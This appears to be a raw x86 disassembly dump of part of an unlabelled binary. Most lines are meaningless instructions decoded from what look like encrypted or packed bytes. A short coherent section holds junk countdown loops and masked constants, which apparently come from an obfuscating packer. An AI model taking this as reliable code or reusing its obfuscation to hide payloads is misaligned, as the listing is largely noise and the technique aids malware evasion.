  40d984:	hlt    
  40d985:	sub    dl,0x6f
  40d988:	sub    al,0x5c
  40d98a:	lahf   
  40d98b:	ins    DWORD PTR es:[edi],dx
  40d98c:	retf   
  40d98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d98e:	lds    ecx,FWORD PTR [edx]
  40d990:	ja     0x40d917
  40d992:	loope  0x40d98d
  40d994:	push   ebx
  40d995:	add    eax,0x647eee7
  40d99a:	add    edi,ebp
  40d99c:	sahf   
  40d99d:	jo     0x40d985
  40d99f:	idiv   DWORD PTR [ecx-0x1db5e767]
  40d9a5:	dec    edi
  40d9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a7:	bound  ebp,QWORD PTR [ecx+0x46]
  40d9aa:	fcom   st(6)
  40d9ac:	dec    edi
  40d9ad:	aad    0x4
  40d9af:	sbb    dl,BYTE PTR [ecx+0x43]
  40d9b2:	inc    edx
  40d9b3:	je     0x40d95e
  40d9b5:	test   al,0xf3
  40d9b7:	push   ecx
  40d9b8:	data16 fcom st(5)
  40d9bb:	add    edx,DWORD PTR [ebp-0x19c60e9c]
  40d9c1:	add    esp,ebx
  40d9c3:	inc    edx
  40d9c4:	gs inc ebx
  40d9c6:	sti    
  40d9c7:	cs hlt 
  40d9c9:	push   es
  40d9ca:	les    eax,FWORD PTR [esi-0x47881c07]
  40d9d0:	arpl   WORD PTR [eax],si
  40d9d2:	inc    ecx
  40d9d3:	imul   eax,DWORD PTR [ebx+0x11cb5cb2],0xfda3b9a8
  40d9dd:	jmp    0x40da38
  40d9df:	ds dec eax
  40d9e1:	inc    ecx
  40d9e2:	pop    esi
  40d9e3:	enter  0x34bd,0xd
  40d9e7:	outs   dx,DWORD PTR ds:[esi]
  40d9e8:	add    al,BYTE PTR [ecx+0xb]
  40d9eb:	cs adc edx,esp
  40d9ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ef:	cmp    eax,0x38435fdf
  40d9f4:	xor    edx,esp
  40d9f6:	inc    esp
  40d9f7:	pop    ds
  40d9f8:	cli    
  40d9f9:	icebp  
  40d9fa:	lahf   
  40d9fb:	add    ch,BYTE PTR [ebp+0xe]
  40d9fe:	popa   
  40d9ff:	jb     0x40da02
  40da01:	cdq    
  40da02:	lea    edx,[eax-0x31]
  40da05:	sub    DWORD PTR [ecx+0x7e3b9e6a],eax
  40da0b:	fist   DWORD PTR [ecx-0x461a29fc]
  40da11:	adc    BYTE PTR [esi-0x1c],bh
  40da14:	adc    esp,DWORD PTR [esi+0x50]
  40da17:	jl     0x40d9f3
  40da19:	xchg   esi,eax
  40da1a:	dec    esp
  40da1b:	jl     0x40d9f1
  40da1d:	fs sub eax,0x53991199
  40da23:	mov    ch,0x17
  40da25:	scas   eax,DWORD PTR es:[edi]
  40da26:	add    al,0xa
  40da28:	mov    ecx,0x8024ec0a
  40da2d:	paddusw mm4,QWORD PTR [edi-0x456875b3]
  40da34:	mov    bh,0x8
  40da36:	popf   
  40da37:	pusha  
  40da38:	retf   
  40da39:	cmp    DWORD PTR [esi+edi*2+0x10987916],ebp
  40da40:	(bad)  
  40da41:	pop    ds
  40da42:	retf   
  40da43:	and    DWORD PTR [esi],0xffdaf378
  40da49:	mov    bl,0xde
  40da4b:	out    dx,al
  40da4c:	or     bh,BYTE PTR gs:[ebx]
  40da4f:	ds rcr ebp,0x93
  40da53:	mov    eax,ds:0x159341bf
  40da58:	xchg   ecx,eax
  40da59:	clc    
  40da5a:	mov    ss,WORD PTR [edi+esi*8]
  40da5d:	js     0x40da93
  40da5f:	mov    dh,0xa2
  40da61:	xor    bl,BYTE PTR [ebp-0x72]
  40da64:	mov    ecx,0x9d5cc54b
  40da69:	inc    ecx
  40da6a:	nop
  40da6b:	xor    eax,0x19875921
  40da70:	sar    DWORD PTR [eax-0x22],1
  40da73:	dec    eax
  40da74:	fs popa 
  40da76:	shr    edi,cl
  40da78:	int    0xd8
  40da7a:	mov    eax,ds:0x32c07ecb
  40da7f:	mov    al,ds:0x604c1a3f
  40da84:	jns    0x40dad6
  40da86:	hlt    
  40da87:	push   0xffffffdb
  40da89:	popf   
  40da8a:	ffreep st(7)
  40da8c:	dec    edx
  40da8d:	mov    ebx,0xc052150b
  40da92:	add    al,0x3c
  40da94:	pop    edi
  40da95:	shl    al,1
  40da97:	add    al,0xaa
  40da99:	ret    
  40da9a:	ds jmp 0x40da3c
  40da9d:	jnp    0x40da43
  40da9f:	sbb    BYTE PTR [edi],dh
  40daa1:	add    DWORD PTR [esp+eax*8+0x1b],edx
  40daa5:	cdq    
  40daa6:	jmp    0x40db17
  40daa8:	stc    
  40daa9:	xchg   DWORD PTR [edi-0x80],edx
  40daac:	enter  0x260b,0xf3
  40dab0:	lahf   
  40dab1:	add    ah,0xf9
  40dab4:	(bad)  
  40dab5:	xchg   esi,eax
  40dab6:	push   0xffffffb1
  40dab8:	cwde   
  40dab9:	fdivr  QWORD PTR [eax-0x4e37948a]
  40dabf:	and    DWORD PTR ds:[ebx+0x60],0xffffffb3
  40dac4:	inc    ebp
  40dac5:	mov    eax,ds:0x9521b0d7
  40daca:	xor    bh,ah
  40dacc:	aam    0x61
  40dace:	sbb    esp,ebx
  40dad0:	adc    ebx,edi
  40dad2:	int3   
  40dad3:	cmp    ebx,ebx
  40dad5:	push   eax
  40dad6:	push   0x4c
  40dad8:	inc    esp
  40dad9:	cmp    dh,BYTE PTR [ebx+ecx*2-0x75]
  40dadd:	out    dx,al
  40dade:	mov    ecx,0x7ed7799a
  40dae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dae4:	jae    0x40daf4
  40dae6:	xor    dl,ch
  40dae8:	mov    dl,0x63
  40daea:	mov    WORD PTR [ebx-0x2f],?
  40daed:	xchg   esi,eax
  40daee:	and    al,0xe0
  40daf0:	pusha  
  40daf1:	leave  
  40daf2:	stos   DWORD PTR es:[edi],eax
  40daf3:	sti    
  40daf4:	ins    DWORD PTR es:[edi],dx
  40daf5:	popa   
  40daf6:	and    esi,DWORD PTR [ebx]
  40daf8:	addr16 out dx,al
  40dafa:	test   eax,0xc118f79d
  40daff:	sub    al,0x71
  40db01:	pop    edi
  40db02:	pop    ebp
  40db03:	fdivr  st(1),st
  40db05:	or     edx,eax
  40db07:	dec    edx
  40db08:	das    
  40db09:	scas   al,BYTE PTR es:[edi]
  40db0a:	std    
  40db0b:	push   edx
  40db0c:	jne    0x40daec
  40db0e:	add    al,0x13
  40db10:	fistp  DWORD PTR [eax-0x63]
  40db13:	cmp    al,0x17
  40db16:	cld    
  40db17:	cli    
  40db18:	and    edx,DWORD PTR [eax]
  40db1a:	jle    0x40dae2
  40db1c:	dec    ebp
  40db1d:	and    eax,0xc20f628d
  40db22:	mov    ah,0x96
  40db24:	mov    edi,0x4cc49dd3
  40db29:	popf   
  40db2a:	xor    al,0x4c
  40db2c:	js     0x40dafb
  40db2e:	cmp    al,0xf9
  40db30:	outs   dx,DWORD PTR ds:[esi]
  40db31:	cmp    dl,BYTE PTR [esp+eax*2+0x16]
  40db35:	or     DWORD PTR fs:[edi-0x31a5c5a6],ecx
  40db3c:	xchg   DWORD PTR [ecx+edi*1],esp
  40db3f:	fdivrp st(0),st
  40db41:	test   DWORD PTR [ecx],ebp
  40db43:	aaa    
  40db44:	jmp    0x40db81
  40db46:	mov    esp,0x19f1e5d5
  40db4b:	in     al,dx
  40db4c:	(bad)  [edi+ebx*8]
  40db4f:	fistp  WORD PTR [esi]
  40db51:	mov    ds:0x52a4b424,eax
  40db56:	pop    edx
  40db57:	mov    edx,0xc37007e2
  40db5c:	and    al,0xe2
  40db5e:	cmp    ebp,0x68b56286
  40db64:	bswap  esi
  40db66:	(bad)  
  40db67:	sbb    DWORD PTR [edi],esi
  40db69:	add    bl,BYTE PTR [edx+0x63]
  40db6c:	inc    ecx
  40db6d:	pop    esp
  40db6e:	or     al,0xd6
  40db70:	pusha  
  40db71:	xchg   edi,eax
  40db72:	(bad)  
  40db73:	jp     0x40dba2
  40db75:	pop    ds
  40db76:	jp     0x40db19
  40db78:	stos   BYTE PTR es:[edi],al
  40db79:	jmp    0xa31895d0
  40db7e:	or     eax,0xead7fbc8
  40db83:	dec    edx
  40db84:	jp     0x40dbf5
  40db86:	jle    0x40db21
  40db88:	lahf   
  40db89:	adc    DWORD PTR [eax+edi*4],ebp
  40db8c:	mov    edi,0xef2df9d1
  40db91:	pop    esi
  40db92:	xor    eax,0x9c01a50b
  40db97:	jg     0x40db5d
  40db99:	and    al,0xcc
  40db9b:	enter  0x1f0c,0x33
  40db9f:	xchg   esi,eax
  40dba0:	lea    ebx,[edx-0x4938d2d]
  40dba6:	push   ebx
  40dba7:	stc    
  40dba8:	dec    edx
  40dba9:	scas   eax,DWORD PTR es:[edi]
  40dbaa:	jo     0x40dbd4
  40dbac:	or     ecx,DWORD PTR [ebp-0x36dde9bf]
  40dbb2:	lock (bad) 
  40dbb5:	dec    edx
  40dbb6:	mov    DWORD PTR [edi-0x1a8f4755],esp
  40dbbc:	fiadd  DWORD PTR [ebx]
  40dbbe:	mov    ds:0x69d208b5,eax
  40dbc3:	adc    eax,0xc9d3bbaf
  40dbc8:	mov    ch,0x68
  40dbca:	std    
  40dbcb:	mov    edx,0xa89369ea
  40dbd0:	push   cs
  40dbd1:	leave  
  40dbd2:	pop    edi
  40dbd3:	lock xlat BYTE PTR ds:[bx]
  40dbd6:	in     al,0xd7
  40dbd8:	push   es
  40dbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbda:	daa    
  40dbdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbdc:	sbb    BYTE PTR [ebp-0xc6473ff],ah
  40dbe2:	imul   edx,edi,0x3e
  40dbe5:	mov    ebp,0x6df0196e
  40dbea:	retf   0x6e8d
  40dbed:	leave  
  40dbee:	mov    DWORD PTR [ecx+0x36e07ce7],edi
  40dbf4:	aaa    
  40dbf5:	inc    edx
  40dbf6:	sbb    eax,eax
  40dbf8:	es inc edx
  40dbfa:	mov    ds:0x5723a292,al
  40dbff:	xchg   edi,eax
  40dc00:	popa   
  40dc01:	inc    ebx
  40dc02:	shl    BYTE PTR ds:0x879c39b4,cl
  40dc08:	inc    edx
  40dc09:	lds    eax,FWORD PTR [ecx+0x25]
  40dc0c:	sbb    DWORD PTR [ebx],ecx
  40dc0e:	lds    esi,FWORD PTR [ebx+0x34e56a68]
  40dc14:	jno    0x40dc7a
  40dc16:	in     eax,0x8b
  40dc18:	pop    ecx
  40dc19:	in     al,0xbf
  40dc1b:	jns    0x40dba6
  40dc1d:	push   es
  40dc1e:	mov    esi,esi
  40dc20:	(bad)  
  40dc22:	mov    bl,0x91
  40dc24:	mov    bl,0x37
  40dc26:	jb     0x40dbdc
  40dc28:	adc    DWORD PTR [ecx+0x1e],0x2db2fc58
  40dc2f:	fcmovnu st,st(1)
  40dc31:	or     edx,esp
  40dc33:	cmp    ebx,DWORD PTR [ecx-0x53]
  40dc36:	push   esi
  40dc37:	pop    eax
  40dc38:	or     al,0xeb
  40dc3a:	add    esi,DWORD PTR [ecx+ebp*4]
  40dc3d:	jb     0x40dbc1
  40dc3f:	push   edx
  40dc40:	jecxz  0x40dc02
  40dc42:	clc    
  40dc43:	cs aas 
  40dc45:	nop
  40dc46:	xor    ebx,DWORD PTR [edx+eax*2+0x74c9a2b6]
  40dc4d:	cmp    DWORD PTR [esi-0x64],ebx
  40dc50:	test   dh,dh
  40dc52:	and    BYTE PTR [ecx-0x18c4454],cl
  40dc58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc59:	in     eax,0x4d
  40dc5b:	shl    BYTE PTR [edx-0x7],0xf4
  40dc5f:	inc    eax
  40dc60:	sbb    bl,BYTE PTR ds:0x755e0bc8
  40dc66:	push   0x9284d3da
  40dc6b:	aam    0xca
  40dc6d:	dec    edi
  40dc6e:	inc    esp
  40dc6f:	push   esi
  40dc70:	pop    ebx
  40dc71:	shl    ebp,cl
  40dc73:	sbb    eax,0x1a0f3224
  40dc78:	lock mov esi,0xc93fe67e
  40dc7e:	xor    ecx,esp
  40dc80:	daa    
  40dc81:	rcr    BYTE PTR [ecx+eax*4+0x4e800587],0xf3
  40dc89:	in     al,0x32
  40dc8b:	cmp    al,0xda
  40dc8d:	test   eax,0xece7a792
  40dc92:	ins    DWORD PTR es:[edi],dx
  40dc93:	xor    eax,0xe9bb9ead
  40dc98:	push   esi
  40dc99:	and    BYTE PTR [ebx-0x3aa70fc0],bh
  40dc9f:	xor    BYTE PTR [ebx+0x68],0x38
  40dca3:	out    0xe6,eax
  40dca5:	jmp    0x6a69af1c
  40dcaa:	mov    ebx,0xcbce3677
  40dcaf:	or     BYTE PTR [eax+0x2269f3ed],ch
  40dcb5:	leave  
  40dcb6:	sar    DWORD PTR [ebx+0x14605eb],1
  40dcbc:	jge    0x40dd01
  40dcbe:	jl     0x40dccf
  40dcc0:	push   esp
  40dcc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcc2:	xor    eax,0x7bcaa770
  40dcc7:	jp     0x40dce6
  40dcc9:	push   cs
  40dcca:	sbb    bh,BYTE PTR [edx+0x44d67661]
  40dcd0:	mov    eax,0x37dad02b
  40dcd5:	xchg   esi,eax
  40dcd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd7:	add    DWORD PTR gs:[ecx],esi
  40dcda:	xchg   edx,eax
  40dcdb:	(bad)  
  40dcdc:	fst    st(7)
  40dcde:	les    edx,FWORD PTR [eax+0x611c8a60]
  40dce4:	jns    0x40dc84
  40dce6:	dec    edx
  40dce7:	cwde   
  40dce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dce9:	cwde   
  40dcea:	ficomp DWORD PTR [ecx]
  40dcec:	jmp    0xc074:0x200a23fc
  40dcf3:	adc    DWORD PTR [ebx+0x1c3929a2],ebp
  40dcf9:	nop
  40dcfa:	ret    0xeec3
  40dcfd:	inc    ebx
  40dcfe:	in     al,0x1c
  40dd00:	enter  0x31a2,0x21
  40dd04:	dec    esi
  40dd05:	gs out 0xf4,al
  40dd08:	sbb    cl,BYTE PTR [edx-0x3]
  40dd0b:	stc    
  40dd0c:	sbb    al,0x17
  40dd0e:	aaa    
  40dd0f:	test   DWORD PTR [ecx+esi*2-0x2f3c79fd],edi
  40dd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd17:	mov    al,cl
  40dd19:	xor    ecx,esi
  40dd1b:	add    DWORD PTR ds:0x42a018,0x42a000
  40dd25:	mov    DWORD PTR [ebp-0x34],eax
  40dd28:	add    ecx,edi
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x42369e
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	ss loop 0x40df4c
  40dedb:	push   ds
  40dedc:	pop    ss
  40dedd:	shl    DWORD PTR [edx+0x62],1
  40dee0:	or     bl,BYTE PTR [edi+0x62]
  40dee3:	bound  eax,QWORD PTR [esi]
  40dee5:	inc    ecx
  40dee6:	xor    esi,eax
  40dee8:	push   eax
  40dee9:	dec    edi
  40deea:	xchg   DWORD PTR [ebx],ebx
  40deec:	mov    ds:0xd84c901e,eax
  40def1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40def2:	jne    0x40dec7
  40def4:	fsub   DWORD PTR [eax+0xe]
  40def7:	ins    BYTE PTR es:[edi],dx
  40def8:	sbb    al,0x58
  40defa:	push   eax
  40defb:	cmp    ebx,ecx
  40defd:	jbe    0x40df43
  40deff:	pop    esi
  40df00:	push   cs
  40df01:	mov    dh,BYTE PTR [ebx-0x60]
  40df04:	pop    edi
  40df05:	xchg   ebx,eax
  40df06:	inc    eax
  40df07:	in     eax,0xe0
  40df09:	push   ebx
  40df0a:	imul   ebx,DWORD PTR [esi-0x45],0x4d
  40df0e:	aad    0x70
  40df10:	xchg   ebp,eax
  40df11:	xchg   edi,eax
  40df12:	sub    BYTE PTR [edx],cl
  40df14:	sub    cl,bh
  40df16:	pop    ebp
  40df17:	and    DWORD PTR [edx-0x6dbcc314],ebx
  40df1d:	and    bh,BYTE PTR [eax]
  40df1f:	pusha  
  40df20:	xor    DWORD PTR [esi],0xf3e32f02
  40df26:	jg     0x40df60
  40df28:	pusha  
  40df29:	aad    0x89
  40df2b:	les    edx,FWORD PTR [edi+0x2d043e63]
  40df31:	call   0x65987eee
  40df36:	fs mov cl,0xd2
  40df39:	sbb    eax,0xbe4c727e
  40df3e:	dec    ecx
  40df3f:	mov    eax,0x78fb7d9f
  40df44:	pusha  
  40df45:	dec    esp
  40df46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df47:	ret    0xd290
  40df4a:	ja     0x40df9d
  40df4c:	out    dx,eax
  40df4d:	xor    BYTE PTR [edx+ebp*4+0x72],bl
  40df51:	icebp  
  40df52:	sub    BYTE PTR [ebp+0x2],cl
  40df55:	dec    esi
  40df56:	mov    ebp,0x516053fc
  40df5b:	mov    dl,0xeb
  40df5d:	adc    BYTE PTR [edi-0x45463e7c],ah
  40df63:	imul   DWORD PTR ds:0x8a80f6d
  40df69:	fld    QWORD PTR [ebp-0x72]
  40df6c:	mov    bh,0x41
  40df6e:	mov    dl,0xc6
  40df70:	xchg   esp,eax
  40df71:	lock xchg ecx,eax
  40df73:	adc    dh,BYTE PTR [ebx-0x93d7b9c]
  40df79:	cdq    
  40df7a:	out    dx,al
  40df7b:	out    0x60,eax
  40df7d:	inc    ebx
  40df7e:	call   0x8e82:0x7ab865aa
  40df85:	push   esp
  40df86:	pop    ds
  40df87:	xchg   ebp,eax
  40df88:	sbb    DWORD PTR ds:0x28098128,esi
  40df8e:	jae    0x40dfa2
  40df90:	movups XMMWORD PTR ss:[ebx-0x67],xmm7
  40df95:	add    esp,DWORD PTR [ebp-0x4db09196]
  40df9b:	mov    edi,0x95ff7bcf
  40dfa0:	push   bx
  40dfa2:	fsubr  st(0),st
  40dfa4:	xor    DWORD PTR [ebp+0x30],esi
  40dfa7:	add    eax,0xa48960e5
  40dfac:	push   edx
  40dfad:	adc    cl,bh
  40dfaf:	add    BYTE PTR [ecx-0x7a331006],dh
  40dfb5:	addr16 aam 0xf7
  40dfb8:	or     BYTE PTR [ebx+0x2f064fac],0x56
  40dfbf:	retf   
  40dfc0:	jne    0x40df70
  40dfc2:	pop    DWORD PTR ds:0xd30611e
  40dfc8:	idiv   BYTE PTR [esi+esi*1]
  40dfcb:	cmc    
  40dfcc:	sub    ebp,ebx
  40dfce:	and    al,bh
  40dfd0:	cld    
  40dfd1:	js     0x40e01f
  40dfd3:	mov    esp,0x96c5d287
  40dfd8:	mov    dl,0xed
  40dfda:	push   0xffffffd9
  40dfdc:	or     edx,edx
  40dfde:	add    eax,0x13f6da0b
  40dfe3:	or     bl,BYTE PTR [ebx+eiz*8-0xae3e4bd]
  40dfea:	test   BYTE PTR [eax-0x1e],dl
  40dfed:	fbld   TBYTE PTR [ecx+0x5a9e4b7e]
  40dff3:	push   ds
  40dff4:	pop    eax
  40dff5:	int3   
  40dff6:	sub    eax,0x9caef5c1
  40dffb:	mov    ch,0xdd
  40dffd:	out    0xb2,al
  40dfff:	stos   DWORD PTR es:[edi],eax
  40e000:	hlt    
  40e001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e002:	ss imul eax,esi,0xe4d571d9
  40e009:	sub    al,0x28
  40e00b:	lods   eax,DWORD PTR ds:[esi]
  40e00c:	(bad)  
  40e00d:	mov    eax,0x6af5c483
  40e012:	sti    
  40e013:	mov    edi,0x68a29beb
  40e018:	xor    esp,DWORD PTR [edx]
  40e01a:	retf   
  40e01b:	cmp    dh,BYTE PTR [esi+0x3e]
  40e01e:	ins    BYTE PTR es:[edi],dx
  40e01f:	test   DWORD PTR [ebx+0x78563e3e],esi
  40e025:	jl     0x40dfb7
  40e027:	xchg   ecx,eax
  40e028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e029:	pop    es
  40e02a:	(bad)  
  40e02b:	aad    0x65
  40e02d:	mov    dh,0x9a
  40e02f:	dec    ebx
  40e030:	imul   edi,DWORD PTR [edi],0xfffffff9
  40e033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e034:	mov    esi,0xc93bce62
  40e039:	mov    al,0xeb
  40e03b:	sahf   
  40e03c:	and    eax,esi
  40e03e:	fwait
  40e03f:	pop    es
  40e040:	cmp    ebx,ebp
  40e042:	adc    eax,0x541a643a
  40e047:	loopne 0x40e052
  40e049:	je     0x40e0c5
  40e04b:	(bad)  
  40e04c:	enter  0xfc58,0xb4
  40e050:	gs stos DWORD PTR es:[edi],eax
  40e052:	(bad)  
  40e053:	(bad)  
  40e054:	cmp    al,0xb8
  40e056:	fnsave [eax]
  40e058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e059:	scas   al,BYTE PTR es:[edi]
  40e05a:	lods   al,BYTE PTR ds:[esi]
  40e05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e05c:	mov    esi,0xb5f0c5ce
  40e061:	iret   
  40e062:	scas   al,BYTE PTR es:[edi]
  40e063:	mov    al,0x57
  40e065:	shl    bh,0xa0
  40e068:	and    ecx,ebp
  40e06a:	or     BYTE PTR [ebx+0x60a1de99],dl
  40e070:	daa    
  40e071:	cdq    
  40e072:	push   es
  40e073:	scas   eax,DWORD PTR es:[edi]
  40e074:	mov    edi,0x7c762f01
  40e079:	mov    al,0x6f
  40e07b:	(bad)  
  40e07c:	repnz out dx,al
  40e07e:	leave  
  40e07f:	xchg   edi,eax
  40e080:	lea    eax,ds:0xd5c0ecdb
  40e086:	xor    bl,ch
  40e088:	dec    eax
  40e089:	addr16 into 
  40e08b:	cld    
  40e08c:	xor    al,0x22
  40e08e:	jle    0x40e0dc
  40e090:	mov    esi,0x9fa8fe55
  40e095:	sub    al,0xa6
  40e097:	mov    dh,0x71
  40e099:	xchg   edi,eax
  40e09a:	call   0xf526:0x9f49e414
  40e0a1:	iret   
  40e0a2:	inc    ecx
  40e0a3:	mov    bh,0xcc
  40e0a5:	jge    0x40e04a
  40e0a7:	jo     0x40e07f
  40e0a9:	push   esp
  40e0aa:	fld    TBYTE PTR [eax+0x25]
  40e0ad:	jecxz  0x40e07f
  40e0af:	sub    eax,DWORD PTR [edi+0x1ebcae56]
  40e0b5:	aaa    
  40e0b6:	sub    ah,dh
  40e0b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b9:	pop    ss
  40e0ba:	je     0x40e10b
  40e0bc:	and    dl,BYTE PTR [edi+0x1e]
  40e0bf:	cs scas eax,DWORD PTR es:[edi]
  40e0c1:	sub    eax,0xd8610b5c
  40e0c6:	jmp    0xd066:0x424095eb
  40e0cd:	push   esp
  40e0ce:	nop
  40e0cf:	imul   esi,esp,0xffffff85
  40e0d2:	shl    BYTE PTR [ebp+eax*4-0x24508617],1
  40e0d9:	es aas 
  40e0db:	hlt    
  40e0dc:	sub    bl,BYTE PTR [edx-0x6]
  40e0df:	push   ebx
  40e0e0:	aas    
  40e0e1:	push   ebx
  40e0e2:	fist   WORD PTR [edi+0x4f8b9e63]
  40e0e8:	aam    0x1c
  40e0ea:	fsubr  DWORD PTR [edi+esi*8-0x1ee0b508]
  40e0f1:	neg    BYTE PTR [edi+0x29ece334]
  40e0f7:	add    cl,BYTE PTR [ebx+0x57894240]
  40e0fd:	mov    esp,0x3bea0454
  40e102:	sub    DWORD PTR [edx-0x5e6e489f],ebx
  40e108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e109:	and    dl,al
  40e10b:	mov    ecx,esp
  40e10d:	(bad)  
  40e10e:	mov    al,BYTE PTR [esi]
  40e110:	pavgw  mm6,mm2
  40e113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e114:	push   ds
  40e115:	push   ss
  40e116:	jmp    0x90d4bf61
  40e11b:	sub    al,0x5f
  40e11d:	scas   al,BYTE PTR es:[edi]
  40e11e:	out    dx,eax
  40e11f:	ins    BYTE PTR es:[edi],dx
  40e120:	nop
  40e121:	in     al,dx
  40e122:	mov    eax,ds
  40e124:	or     edi,edi
  40e126:	stos   DWORD PTR es:[edi],eax
  40e127:	sub    bl,BYTE PTR [ecx+0xd]
  40e12a:	adc    BYTE PTR [edx-0x1d],dl
  40e12d:	xlat   BYTE PTR ds:[ebx]
  40e12e:	cdq    
  40e12f:	jae    0x40e17e
  40e131:	aad    0xdc
  40e133:	or     ebx,ecx
  40e135:	or     ah,ch
  40e137:	fsubr  st,st(2)
  40e139:	or     al,0x60
  40e13b:	lock loopne 0x40e151
  40e13e:	fisub  WORD PTR [ebx]
  40e140:	mov    ecx,0x9c6ea17
  40e145:	add    BYTE PTR [edi+0x2e],ah
  40e148:	stc    
  40e149:	mov    eax,0xa463b12d
  40e14e:	inc    eax
  40e14f:	dec    eax
  40e150:	jecxz  0x40e0e4
  40e152:	data16 daa 
  40e154:	jbe    0x40e1ae
  40e156:	xor    eax,0x2ecc0636
  40e15b:	xchg   ebp,eax
  40e15c:	cmp    dh,bh
  40e15e:	push   ebx
  40e15f:	iret   
  40e160:	cmp    DWORD PTR [ebx-0xda17132],edi
